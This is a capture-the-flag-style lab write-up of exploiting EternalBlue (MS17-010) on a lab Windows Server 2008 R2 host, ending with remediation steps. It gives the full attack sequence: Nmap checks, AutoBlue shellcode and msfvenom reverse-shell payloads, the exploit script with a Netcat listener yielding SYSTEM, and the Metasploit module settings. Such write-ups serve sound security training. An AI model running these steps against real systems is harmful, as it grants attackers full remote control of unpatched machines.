---
title: "EternalBlue (MS17-010)"
description: "Detecting and exploiting the EternalBlue SMBv1 vulnerability (MS17-010 / CVE-2017-0143) two ways: manually with AutoBlue and automatically with Metasploit, gaining SYSTEM on Windows Server 2008 R2."
date: 2025-10-27
platform: "INE Labs"
difficulty: "Medium"
tags: ["EternalBlue", "MS17-010", "CVE-2017-0143", "SMB", "Metasploit", "Windows"]
cover: "./photo1.png"
---

# EternalBlue (MS17-010)

**Classification:** Assessment Methodologies / Vulnerability Assessment<br>
**Target:** 10.10.10.12 (Windows Server 2008 R2 Standard SP1 x64)<br>
**Attacker:** 10.10.10.10

## 1. Executive Summary

The target exposes **SMBv1** on port 445 and is vulnerable to **EternalBlue (MS17-010 /
CVE-2017-0143)**, a critical remote code execution flaw. After confirming the
vulnerability with an Nmap NSE script, we exploit it two ways: manually with the **AutoBlue**
scripts (custom shellcode + Netcat listener) and automatically with **Metasploit**. Both
yield a shell running as **NT AUTHORITY\SYSTEM**.

## 2. Reconnaissance

```bash
sudo nmap -sV -p 445 -O 10.10.10.12
```

Port `445/tcp` (microsoft-ds) is open on a **Windows Server 2008 R2 - 2012** host.

![Nmap service and OS scan](./photo1.png)

## 3. Vulnerability Check

```bash
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 10.10.10.12
```

![Running the smb-vuln-ms17-010 script](./photo2.png)

The script confirms the host is **VULNERABLE** to MS17-010 (CVE-2017-0143, risk factor
HIGH).

![smb-vuln-ms17-010 - target is vulnerable](./photo3.png)

## 4. Method A — Manual Exploitation with AutoBlue

After cloning and installing the **AutoBlue-MS17-010** repository, we review its contents
(the `eternalblue_exploit*.py` scripts and `shell_prep.sh`).

```bash
ls -al
```

![AutoBlue repository contents](./photo4.png)

We enter the `shellcode` folder, where the preparation script lives.

```bash
cd shellcode
```

![Entering the shellcode folder](./photo5.png)

Running the preparation script compiles the kernel shellcode and uses msfvenom to generate
the reverse-shell payloads (LHOST `10.10.10.10`, LPORT `1234`).

```bash
./shell_prep.sh
# LHOST: 10.10.10.10 | LPORT: 1234 | cmd shell (1) | stageless (1)
```

![shell_prep.sh - generating the payloads](./photo6.png)

Both the x64 and x86 payloads are generated and merged.

![msfvenom payloads generated and merged](./photo7.png)

We launch the exploit against the target using the generated x64 shellcode.

```bash
python eternalblue_exploit7.py 10.10.10.12 shellcode/sc_x64.bin
```

![Running the AutoBlue exploit](./photo8.png)

With a Netcat listener on the chosen port we catch the reverse shell as SYSTEM.

```bash
nc -nvlp 1234
whoami
# nt authority\system
```

![Netcat reverse shell - SYSTEM access](./photo9.png)

## 5. Method B — Automatic Exploitation with Metasploit

The same result can be achieved with Metasploit, which stores the results in its database.

```bash
search eternalblue
```

![Searching EternalBlue modules in Metasploit](./photo10.png)

We select the EternalBlue exploit module.

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

![Selecting the ms17_010_eternalblue module](./photo11.png)

```bash
set RHOSTS 10.10.10.12
set LHOST 10.10.10.10
```

![Setting the target RHOSTS](./photo12.png)

Running the exploit first checks the target (likely vulnerable) and then launches the
attack.

```bash
exploit
```

![Exploit start - check confirms vulnerable](./photo13.png)

The ETERNALBLUE overwrite completes successfully and a Meterpreter session is opened.

![ETERNALBLUE overwrite successful - Meterpreter session](./photo14.png)

## 6. Remediation Recommendations

1. **Apply the MS17-010 patch** (March 2017) on all affected Windows systems.
2. **Disable SMBv1** entirely; use SMB 2/3 only.
3. **Restrict SMB exposure:** block port 445 from untrusted networks and segment internal
   networks to limit lateral movement.
4. **Decommission end-of-life systems** such as Windows Server 2008 R2 that no longer
   receive security updates.
